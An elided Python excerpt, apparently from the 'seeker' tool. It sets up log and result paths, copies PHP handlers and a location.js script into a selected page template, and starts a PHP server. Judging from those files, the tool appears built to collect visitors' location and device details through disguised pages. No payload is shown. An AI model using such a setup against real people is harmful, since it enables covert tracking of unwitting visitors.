...
SITE = ''
SERVER_PROC = ''
LOG_DIR = path.join(path_to_script, 'logs')
DB_DIR = path.join(path_to_script, 'db')
LOG_FILE = path.join(LOG_DIR, 'php.log')
DATA_FILE = path.join(DB_DIR, 'results.csv')
INFO = path.join(LOG_DIR, 'info.txt')
RESULT = path.join(LOG_DIR, 'result.txt')
TEMPLATES_JSON = path.join(path_to_script, 'template', 'templates.json')
TEMP_KML = path.join(path_to_script, 'template', 'sample.kml')
META_FILE = path.join(path_to_script, 'metadata.json')
META_URL = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/metadata.json'
PID_FILE = path.join(path_to_script, 'pid')
...
def template_select(site):
    ...
    if templateNum is not None:
        if templateNum >= 0 and templateNum < len(templ_json['templates']):
            ...
            print()
            utils.print(f'{R}[-] {C}Invalid Template Number!{W}')
            sys.exit()
    else:
        print()
        utils.print(f'{R}[-] {C}Template number is required! Use -t <num>.{W}')
        sys.exit()
    try:
    ...
    template_dir = path.join(path_to_script, 'template', site)
    shutil.copyfile(path.join(path_to_script, 'php', 'error.php'), path.join(template_dir, 'error_handler.php'))
    shutil.copyfile(path.join(path_to_script, 'php', 'info.php'), path.join(template_dir, 'info_handler.php'))
    shutil.copyfile(path.join(path_to_script, 'php', 'result.php'), path.join(template_dir, 'result_handler.php'))
    jsdir = path.join(template_dir, 'js')
    if not path.isdir(jsdir):
        mkdir(jsdir)
    shutil.copyfile(path.join(path_to_script, 'js', 'location.js'), path.join(jsdir, 'location.js'))
    return site
...
def server():
    ...
    if _shutil.which('php') is None:
        ...
        utils.print(f'{R}[-] {C}PHP is not installed or not in your PATH. Please install PHP to continue.{W}')
        sys.exit(1)
    template_dir = path.join(path_to_script, 'template', SITE)
    cmd = ['php', '-S', f'0.0.0.0:{port}', '-t', template_dir]
